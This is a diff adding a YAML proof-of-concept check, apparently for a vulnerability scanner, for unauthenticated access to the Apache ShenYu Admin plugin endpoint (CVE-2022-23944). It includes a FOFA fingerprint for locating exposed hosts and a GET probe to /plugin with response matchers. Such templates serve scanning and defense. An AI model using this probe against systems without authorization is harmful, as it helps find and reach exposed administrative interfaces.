@@ -1,0 +1,18 @@
+id: poc-yaml-shenyu-plugin-unauth-access
+info:
+  name: apache ShenYu Admin plugin 未授权访问漏洞（CVE-2022-23944）
+  severity: high
+  tags:
+  - 两高一弱
+  - 未授权访问
+  - CVE-2022-23944
+  finger: shenyu
+  fofa: fofa:body="id=\"httpPath\" style=\"display冒号 none"
+requests:
+- method: GET
+  path: /plugin
+  expression: "status_code == 200 && \ncontains(find_json(body,\"code\"), \"200\"\
+    ) &&\ncontains(find_json(body,\"message\"), \"query success\") &&\ncontains(find_json(body,\"\
+    data\"), \"page\") &&\ncontains(find_json(body,\"data\"), \"dataList\")\n"
+variables: {}
+transport: http
